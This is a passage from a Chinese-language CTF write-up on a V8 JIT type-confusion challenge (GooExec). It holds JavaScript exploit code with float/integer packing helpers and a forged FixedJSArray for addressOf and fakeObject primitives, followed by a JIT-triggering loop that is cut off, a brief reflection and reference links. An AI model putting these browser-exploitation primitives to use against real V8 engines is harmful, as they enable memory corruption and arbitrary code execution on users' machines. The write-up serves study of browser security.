    function p64(low4,high4) {
       dv.setUint32(0x8,low4,true);
       dv.setUint32(0xC,high4,true);
       var float_val = dv.getFloat64(0x8,true);
       return float_val;
    }
    //解包64位浮点数的低四字节
    function u64_l(val) {
       dv.setFloat64(0x8,val,true);
       return dv.getUint32(0x8,true);
    }
    //解包64位浮点数的高四字节
    function u64_h(val) {
       dv.setFloat64(0x8,val,true);
       return dv.getUint32(0xC,true);
    }
    //伪造一个FixedJSArray对象用于构造addressOf和fakeObject原语
    faker[1] = p64(0x082031cd,0x080426dd);
    faker[2] = p64(0x08342135,0x2);
    //伪造FixedJSArray的element
    faker[3] = p64(0x080424a5,0x2);
    //强制触发JIT编译，生成有漏洞的代码
    let a;
    for (let i = 0; i 
## 0x03 感想
通过这一题，学习了v8方面的很多知识，对JIT也有了一定的了解
## 0x04 参考
[强网杯2020线下GooExec](https://bbs.pediy.com/thread-262205.htm)  
[你可能不知道的v8数组优化](https://segmentfault.com/a/1190000023193375)  
[深入理解Js数组](https://blog.csdn.net/qq_40413670/article/details/106738425)  
[(v8 source)elements-kind.h](https://source.chromium.org/chromium/v8/v8.git/+/ec37390b2ba2b4051f46f153a8cc179ed4656f5d:src/elements-kind.h;l=14)  
[Google Chrome V8 JIT – ‘LoadElimination::ReduceTransitionElementsKind’ Type
Confusion](https://www.anquanke.com/vul/id/1069139)